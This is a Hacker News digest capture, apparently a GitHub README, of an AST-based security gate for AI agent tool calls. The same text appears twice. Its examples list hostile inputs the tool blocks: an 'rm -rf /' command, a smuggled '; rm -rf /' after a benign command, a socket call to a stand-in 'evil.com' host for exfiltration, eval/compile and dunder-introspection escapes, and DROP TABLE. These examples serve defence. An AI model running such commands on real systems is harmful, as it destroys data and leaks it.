---
source: "https://github.com/MvikManners/aw1-circuit-breaker"
hn_url: "https://news.ycombinator.com/item?id=50185134"
title: "Show HN: Aw-1 – Deterministic AST circuit breaker and kernel jail for AI agents"
article_title: "GitHub - MvikManners/aw1-circuit-breaker: Deterministic sub-0.2ms AST security circuit breaker for autonomous AI agents, tool dispatch pipelines, and MCP servers. · GitHub"
image: "https://opengraph.githubassets.com/017b9954eaaa57d207f6ecc6500afd1f6162e01c4b3b27f5fefa379ccf5e6eec/MvikManners/aw1-circuit-breaker"
author: "MvikVela"
captured_at: "2026-10-21T18:25:59Z"
capture_tool: "hn-digest"
hn_id: 50185134
score: 1
comments: 0
posted_at: "2026-10-21T18:08:36Z"
tags:
  - hacker-news
---

# Show HN: Aw-1 – Deterministic AST circuit breaker and kernel jail for AI agents

- HN: [50185134](https://news.ycombinator.com/item?id=50185134)
- Source: [github.com](https://github.com/MvikManners/aw1-circuit-breaker)
- Score: 1
- Comments: 0
- Posted: 2026-10-21T18:08:36Z

## Translation

Title: Show HN: Aw-1 – Deterministic AST circuit breaker and kernel jail for AI agents
Article title: GitHub - MvikManners/aw1-circuit-breaker: Deterministic sub-0.2ms AST security circuit breaker for autonomous AI agents, tool dispatch pipelines, and MCP servers. · GitHub
Description: Deterministic sub-0.2ms AST security circuit breaker for autonomous AI agents, tool dispatch pipelines, and MCP servers. - MvikManners/aw1-circuit-breaker

Article text:
GitHub - MvikManners/aw1-circuit-breaker: Deterministic sub-0.2ms AST security circuit breaker for autonomous AI agents, tool dispatch pipelines, and MCP servers. · GitHub
Skip to content
Navigation Menu
Sign in Appearance settings Platform AI CODE CREATION GitHub Copilot Write better code with AI
GitHub Copilot app Direct agents from issue to merge
MCP Registry Integrate external tools
DEVELOPER WORKFLOWS Actions Automate any workflow
Codespaces Instant dev environments
Code Review Manage code changes
Code Quality Enforce quality at merge
APPLICATION SECURITY GitHub Advanced Security Find and fix vulnerabilities
Code security Secure your code as you build
Secret protection Stop leaks before they start
Solutions BY COMPANY SIZE Enterprises
EXPLORE BY TYPE Customer stories
SUPPORT & SERVICES Documentation
Open Source COMMUNITY GitHub Sponsors Fund open source developers
Enterprise ENTERPRISE SOLUTIONS Enterprise platform AI-powered developer platform
AVAILABLE ADD-ONS GitHub Advanced Security Enterprise-grade security features
Copilot for Business Enterprise-grade AI features
Premium Support Enterprise-grade 24/7 support
Search / Sign in Sign up Appearance settings
You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.
Dismiss alert
{{ message }}
MvikManners
aw1-circuit-breaker Public Notifications You must be signed in to change notification settings
Star 1 ( 1 ) You must be signed in to star a repository
Deterministic sub-0.2ms AST security circuit breaker for autonomous AI agents, tool dispatch pipelines, and MCP servers.
Readme Apache-2.0 license Activity Stars
0 forks Report repository main Branches Tags Go to file Code Open more actions menu Latest commit
63 Commits 63 Commits Folders and files
.github/ workflows .github/ workflows aw1 aw1 aw1_breaker aw1_breaker docs docs examples examples tests tests .gitignore .gitignore ATTESTATION_LIFECYCLE.md ATTESTATION_LIFECYCLE.md AW1_ENTERPRISE_WHITEPAPER.md AW1_ENTERPRISE_WHITEPAPER.md AW1_Ledger_Technical_Audit_Dossier_v2.0.1.pdf AW1_Ledger_Technical_Audit_Dossier_v2.0.1.pdf CHANGELOG.md CHANGELOG.md LICENSE LICENSE README.md README.md agent_pipeline.py agent_pipeline.py aw1.policy.json aw1.policy.json aw1_hcs_worker.py aw1_hcs_worker.py aw1_langgraph.py aw1_langgraph.py benchmark.py benchmark.py benchmark_concurrency.py benchmark_concurrency.py deployment_manifest.json deployment_manifest.json generate_manifest.py generate_manifest.py manifest_anchor_receipt.json manifest_anchor_receipt.json mcp_server.py mcp_server.py pyproject.toml pyproject.toml release_signer_ed25519.pub release_signer_ed25519.pub server.json server.json test_all.sh test_all.sh test_api_gateway.py test_api_gateway.py test_guard.py test_guard.py test_hardware_interlocks.py test_hardware_interlocks.py test_langgraph_guard.py test_langgraph_guard.py test_production_gate.py test_production_gate.py View all files Repository files navigation
Featured on Hashgraph Online (HOL): Read the independent source-level teardown: What aw1-breaker checks before a tool call .
aw1-breaker is a zero-dependency Python security circuit breaker that intercepts autonomous AI agent tool calls in sub-millisecond execution loops using Abstract Syntax Tree (AST) decompilation, declarative Policy-as-Code, per-actor rolling velocity monitors, and cryptographically signed HMAC execution tokens.
High-Concurrency Performance (v2.1.0 Verified)
Evaluated across a stress test of 10,000 asynchronous agent dispatches in concurrent batches of 500 simultaneous tasks:
⚡ 10-Second Test Drive (Zero-Install)
Test the circuit breaker live in your terminal without installing anything:
uvx aw1-circuit-breaker --demo
Or verify an arbitrary snippet:
uvx aw1-circuit-breaker verify " subprocess.run(['rm', '-rf', '/']) "
📦 Installation
pip install --upgrade aw1-circuit-breaker
(Zero external dependencies. Pure Python standard library: Python 3.10 to 3.13).
🛡️ Enterprise Guard (Turnkey Integration)
Drop enterprise boundary policies directly onto agent tools using the @guard.protect or universal @guard adapter:
from aw1 import EnterpriseGuard , SecurityViolationError
guard = EnterpriseGuard (
allowed_tools = [ "safe_query" , "fetch_market_data" ],
max_velocity_per_min = 60 ,
max_financial_limit = 250.0 ,
readonly_sql = True
)
@ guard . protect ( tool_name = "safe_query" )
def execute_database_query ( query : str ):
return db . execute ( query )
# Benign queries execute instantly (< 0.2ms)
execute_database_query ( "SELECT id FROM users LIMIT 1;" )
# Adversarial AST injections & SQL drops are halted deterministically:
# -> Raises SecurityViolationError: "Database mutation rejected under readonly_sql policy"
Universal Function & Async Gating
from aw1 import guard
@ guard
async def run_agent_tool ( tool_payload : dict ) -> dict :
return { "status" : "ok" }
🔌 Model Context Protocol (MCP) Server
python mcp_server.py
Or via uvx :
uvx aw1-circuit-breaker
MCP Client Configuration
Add to your Claude Desktop or Cursor configuration:
{
"mcpServers" : {
"aw1-circuit-breaker" : {
"command" : " uvx " ,
"args" : [ " aw1-circuit-breaker " ]
}
}
}
⚔️ Exploit Interception in Action
AW-1 operates deterministically at the Abstract Syntax Tree (AST) level before code reaches Python's runtime execution frame. Probabilistic prompt-based guardrails fail under encoding obfuscation; AST inspection guarantees deterministic enforcement.
Attack Vector
Attacker Strategy
LLM Guardrail Result
AW-1 AST Circuit Breaker
Dynamic Execution
eval(compile(...))
Evades semantic filters
🛑 Tripped ( RESTRICTED_INVOCATION )
Shell Escapes
subprocess.Popen(['bash', ...])
Masked as system task
🛑 Tripped ( UNAUTHORIZED_MODULE_IMPORT )
Lateral Exfiltration
socket.connect(('evil.com', 443))
Disguised as HTTP fetch
🛑 Tripped ( UNAUTHORIZED_MODULE_IMPORT )
SQL Destruction
DROP TABLE users;
Prompt jailbreak bypass
🛑 Tripped ( HALT_SQL_MUTATION_FORBIDDEN )
Dunder Introspection
().__class__.__subclasses__()
Bypasses keyword filters
🛑 Tripped ( FAIL_CLOSED_REFLECTION_BREACH )
Run the Showcase
python examples/enterprise_guard_demo.py
⏱️ Runtime Latency Telemetry
Deterministic security must not throttle agent execution. AW-1 operates with sub-millisecond AST parsing and microsecond-scale argument filtering across warm execution loops.
Sample Size: 1,000 synthetic iterations per test vector on Debian Python 3.13.
python benchmark.py
🧩 Framework Integration (LangGraph Example)
AW-1 drops directly into autonomous agent execution nodes prior to tool dispatch:
from examples . langgraph_adapter import execute_agent_action , CircuitBreakerException
# Guard autonomous agent tool dispatches
try :
execute_agent_action ( bash_tool , "bash_tool" , { "cmd" : "cat log.txt; rm -rf /" })
except CircuitBreakerException as blocked :
print ( f"Tool call halted: { blocked } " )
🌐 Cloud REST API Gateway & Production Quotas
The AW-1 Circuit Breaker provides a production-grade HTTP interception gateway for microservices, browser frontends, and autonomous agent platforms.
Endpoint: POST https://p20.laveto.net/wisdom/api/v1/intercept
CORS: Enabled ( Access-Control-Allow-Origin: * )
Arbitration Engine Latency: < 0.80 ms
{
"actor_id" : " agent-alpha-01 " ,
"tool_name" : " sql_query " ,
"payload" : " SELECT id, balance FROM accounts WHERE user_id = 42; "
}
Response Schema
1. Permitted Execution (Token Minted)
{
"status" : " PERMITTED " ,
"verdict" : " PASS " ,
"permitted" : true ,
"actor_id" : " agent-alpha-01 " ,
"tool_name" : " sql_query " ,
"token" : " aw1_sec_dev_dummy_key_000000000000 " ,
"reason" : " Policy evaluation completed: execution safe " ,
"latency_ms" : 0.762 ,
"circuit_breaker" : " AW-1 Sovereign Execution Arbitrator "
}
2. Threat Contained (Fail-Closed)
{
"status" : " HALT_AND_CONTAIN " ,
"verdict" : " FAIL_CLOSED " ,
"permitted" : false ,
"actor_id" : " agent-alpha-01 " ,
"tool_name" : " bash " ,
"token" : null ,
"reason" : " AST Circuit Breaker containment triggered " ,
"latency_ms" : 0.201 ,
"circuit_breaker" : " AW-1 Sovereign Execution Arbitrator "
}
Production Quotas & Pricing
Plan
Pricing (USD / BWP)
Quota & Features
Access / Checkout
Developer Sandbox
Free
10,000 requests, HMAC token minting
Code HOL-BREAKER-2026
Developer Pro
$49 / BWP 650 /mo
100,000 audit requests, 1 license key, offline HMAC validation
Upgrade to Pro
Team / Startup
$199 / BWP 2,650 /mo
1,000,000 audit requests, 5 seat keys, Redis state sync
Upgrade to Team
Enterprise Dedicated
$990 / BWP 13,200 /mo
Unlimited seats, dedicated gateway tenant, custom statutory lenses
Enterprise Desk
To activate enterprise quotas, pass your signed bearer token in the Authorization header:
curl -X POST [https://p20.laveto.net/wisdom/api/v1/intercept](https://p20.laveto.net/wisdom/api/v1/intercept) \
-H " Authorization: Bearer AW1-EXEC-TOKEN-... " \
-H " Content-Type: application/json " \
-d ' {"actor_id": "prod-agent-01", "tool_name": "db_query", "payload": "SELECT 1;"} '
License
Licensed under the Apache License, Version 2.0 . See LICENSE for details.
Deterministic sub-0.2ms AST security circuit breaker for autonomous AI agents, tool dispatch pipelines, and MCP servers.
Readme Apache-2.0 license Activity Stars
0 forks Report repository Releases
© 2026 GitHub, Inc.
Footer navigation
Do not share my personal information

## Original Extract

Deterministic sub-0.2ms AST security circuit breaker for autonomous AI agents, tool dispatch pipelines, and MCP servers. - MvikManners/aw1-circuit-breaker

GitHub - MvikManners/aw1-circuit-breaker: Deterministic sub-0.2ms AST security circuit breaker for autonomous AI agents, tool dispatch pipelines, and MCP servers. · GitHub
Skip to content
Navigation Menu
Sign in Appearance settings Platform AI CODE CREATION GitHub Copilot Write better code with AI
GitHub Copilot app Direct agents from issue to merge
MCP Registry Integrate external tools
DEVELOPER WORKFLOWS Actions Automate any workflow
Codespaces Instant dev environments
Code Review Manage code changes
Code Quality Enforce quality at merge
APPLICATION SECURITY GitHub Advanced Security Find and fix vulnerabilities
Code security Secure your code as you build
Secret protection Stop leaks before they start
Solutions BY COMPANY SIZE Enterprises
EXPLORE BY TYPE Customer stories
SUPPORT & SERVICES Documentation
Open Source COMMUNITY GitHub Sponsors Fund open source developers
Enterprise ENTERPRISE SOLUTIONS Enterprise platform AI-powered developer platform
AVAILABLE ADD-ONS GitHub Advanced Security Enterprise-grade security features
Copilot for Business Enterprise-grade AI features
Premium Support Enterprise-grade 24/7 support
Search / Sign in Sign up Appearance settings
You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.
Dismiss alert
{{ message }}
MvikManners
aw1-circuit-breaker Public Notifications You must be signed in to change notification settings
Star 1 ( 1 ) You must be signed in to star a repository
Deterministic sub-0.2ms AST security circuit breaker for autonomous AI agents, tool dispatch pipelines, and MCP servers.
Readme Apache-2.0 license Activity Stars
0 forks Report repository main Branches Tags Go to file Code Open more actions menu Latest commit
63 Commits 63 Commits Folders and files
.github/ workflows .github/ workflows aw1 aw1 aw1_breaker aw1_breaker docs docs examples examples tests tests .gitignore .gitignore ATTESTATION_LIFECYCLE.md ATTESTATION_LIFECYCLE.md AW1_ENTERPRISE_WHITEPAPER.md AW1_ENTERPRISE_WHITEPAPER.md AW1_Ledger_Technical_Audit_Dossier_v2.0.1.pdf AW1_Ledger_Technical_Audit_Dossier_v2.0.1.pdf CHANGELOG.md CHANGELOG.md LICENSE LICENSE README.md README.md agent_pipeline.py agent_pipeline.py aw1.policy.json aw1.policy.json aw1_hcs_worker.py aw1_hcs_worker.py aw1_langgraph.py aw1_langgraph.py benchmark.py benchmark.py benchmark_concurrency.py benchmark_concurrency.py deployment_manifest.json deployment_manifest.json generate_manifest.py generate_manifest.py manifest_anchor_receipt.json manifest_anchor_receipt.json mcp_server.py mcp_server.py pyproject.toml pyproject.toml release_signer_ed25519.pub release_signer_ed25519.pub server.json server.json test_all.sh test_all.sh test_api_gateway.py test_api_gateway.py test_guard.py test_guard.py test_hardware_interlocks.py test_hardware_interlocks.py test_langgraph_guard.py test_langgraph_guard.py test_production_gate.py test_production_gate.py View all files Repository files navigation
Featured on Hashgraph Online (HOL): Read the independent source-level teardown: What aw1-breaker checks before a tool call .
aw1-breaker is a zero-dependency Python security circuit breaker that intercepts autonomous AI agent tool calls in sub-millisecond execution loops using Abstract Syntax Tree (AST) decompilation, declarative Policy-as-Code, per-actor rolling velocity monitors, and cryptographically signed HMAC execution tokens.
High-Concurrency Performance (v2.1.0 Verified)
Evaluated across a stress test of 10,000 asynchronous agent dispatches in concurrent batches of 500 simultaneous tasks:
⚡ 10-Second Test Drive (Zero-Install)
Test the circuit breaker live in your terminal without installing anything:
uvx aw1-circuit-breaker --demo
Or verify an arbitrary snippet:
uvx aw1-circuit-breaker verify " subprocess.run(['rm', '-rf', '/']) "
📦 Installation
pip install --upgrade aw1-circuit-breaker
(Zero external dependencies. Pure Python standard library: Python 3.10 to 3.13).
🛡️ Enterprise Guard (Turnkey Integration)
Drop enterprise boundary policies directly onto agent tools using the @guard.protect or universal @guard adapter:
from aw1 import EnterpriseGuard , SecurityViolationError
guard = EnterpriseGuard (
allowed_tools = [ "safe_query" , "fetch_market_data" ],
max_velocity_per_min = 60 ,
max_financial_limit = 250.0 ,
readonly_sql = True
)
@ guard . protect ( tool_name = "safe_query" )
def execute_database_query ( query : str ):
return db . execute ( query )
# Benign queries execute instantly (< 0.2ms)
execute_database_query ( "SELECT id FROM users LIMIT 1;" )
# Adversarial AST injections & SQL drops are halted deterministically:
# -> Raises SecurityViolationError: "Database mutation rejected under readonly_sql policy"
Universal Function & Async Gating
from aw1 import guard
@ guard
async def run_agent_tool ( tool_payload : dict ) -> dict :
return { "status" : "ok" }
🔌 Model Context Protocol (MCP) Server
python mcp_server.py
Or via uvx :
uvx aw1-circuit-breaker
MCP Client Configuration
Add to your Claude Desktop or Cursor configuration:
{
"mcpServers" : {
"aw1-circuit-breaker" : {
"command" : " uvx " ,
"args" : [ " aw1-circuit-breaker " ]
}
}
}
⚔️ Exploit Interception in Action
AW-1 operates deterministically at the Abstract Syntax Tree (AST) level before code reaches Python's runtime execution frame. Probabilistic prompt-based guardrails fail under encoding obfuscation; AST inspection guarantees deterministic enforcement.
Attack Vector
Attacker Strategy
LLM Guardrail Result
AW-1 AST Circuit Breaker
Dynamic Execution
eval(compile(...))
Evades semantic filters
🛑 Tripped ( RESTRICTED_INVOCATION )
Shell Escapes
subprocess.Popen(['bash', ...])
Masked as system task
🛑 Tripped ( UNAUTHORIZED_MODULE_IMPORT )
Lateral Exfiltration
socket.connect(('evil.com', 443))
Disguised as HTTP fetch
🛑 Tripped ( UNAUTHORIZED_MODULE_IMPORT )
SQL Destruction
DROP TABLE users;
Prompt jailbreak bypass
🛑 Tripped ( HALT_SQL_MUTATION_FORBIDDEN )
Dunder Introspection
().__class__.__subclasses__()
Bypasses keyword filters
🛑 Tripped ( FAIL_CLOSED_REFLECTION_BREACH )
Run the Showcase
python examples/enterprise_guard_demo.py
⏱️ Runtime Latency Telemetry
Deterministic security must not throttle agent execution. AW-1 operates with sub-millisecond AST parsing and microsecond-scale argument filtering across warm execution loops.
Sample Size: 1,000 synthetic iterations per test vector on Debian Python 3.13.
python benchmark.py
🧩 Framework Integration (LangGraph Example)
AW-1 drops directly into autonomous agent execution nodes prior to tool dispatch:
from examples . langgraph_adapter import execute_agent_action , CircuitBreakerException
# Guard autonomous agent tool dispatches
try :
execute_agent_action ( bash_tool , "bash_tool" , { "cmd" : "cat log.txt; rm -rf /" })
except CircuitBreakerException as blocked :
print ( f"Tool call halted: { blocked } " )
🌐 Cloud REST API Gateway & Production Quotas
The AW-1 Circuit Breaker provides a production-grade HTTP interception gateway for microservices, browser frontends, and autonomous agent platforms.
Endpoint: POST https://p20.laveto.net/wisdom/api/v1/intercept
CORS: Enabled ( Access-Control-Allow-Origin: * )
Arbitration Engine Latency: < 0.80 ms
{
"actor_id" : " agent-alpha-01 " ,
"tool_name" : " sql_query " ,
"payload" : " SELECT id, balance FROM accounts WHERE user_id = 42; "
}
Response Schema
1. Permitted Execution (Token Minted)
{
"status" : " PERMITTED " ,
"verdict" : " PASS " ,
"permitted" : true ,
"actor_id" : " agent-alpha-01 " ,
"tool_name" : " sql_query " ,
"token" : " aw1_sec_dev_dummy_key_000000000000 " ,
"reason" : " Policy evaluation completed: execution safe " ,
"latency_ms" : 0.762 ,
"circuit_breaker" : " AW-1 Sovereign Execution Arbitrator "
}
2. Threat Contained (Fail-Closed)
{
"status" : " HALT_AND_CONTAIN " ,
"verdict" : " FAIL_CLOSED " ,
"permitted" : false ,
"actor_id" : " agent-alpha-01 " ,
"tool_name" : " bash " ,
"token" : null ,
"reason" : " AST Circuit Breaker containment triggered " ,
"latency_ms" : 0.201 ,
"circuit_breaker" : " AW-1 Sovereign Execution Arbitrator "
}
Production Quotas & Pricing
Plan
Pricing (USD / BWP)
Quota & Features
Access / Checkout
Developer Sandbox
Free
10,000 requests, HMAC token minting
Code HOL-BREAKER-2026
Developer Pro
$49 / BWP 650 /mo
100,000 audit requests, 1 license key, offline HMAC validation
Upgrade to Pro
Team / Startup
$199 / BWP 2,650 /mo
1,000,000 audit requests, 5 seat keys, Redis state sync
Upgrade to Team
Enterprise Dedicated
$990 / BWP 13,200 /mo
Unlimited seats, dedicated gateway tenant, custom statutory lenses
Enterprise Desk
To activate enterprise quotas, pass your signed bearer token in the Authorization header:
curl -X POST [https://p20.laveto.net/wisdom/api/v1/intercept](https://p20.laveto.net/wisdom/api/v1/intercept) \
-H " Authorization: Bearer AW1-EXEC-TOKEN-... " \
-H " Content-Type: application/json " \
-d ' {"actor_id": "prod-agent-01", "tool_name": "db_query", "payload": "SELECT 1;"} '
License
Licensed under the Apache License, Version 2.0 . See LICENSE for details.
Deterministic sub-0.2ms AST security circuit breaker for autonomous AI agents, tool dispatch pipelines, and MCP servers.
Readme Apache-2.0 license Activity Stars
0 forks Report repository Releases
© 2026 GitHub, Inc.
Footer navigation
Do not share my personal information
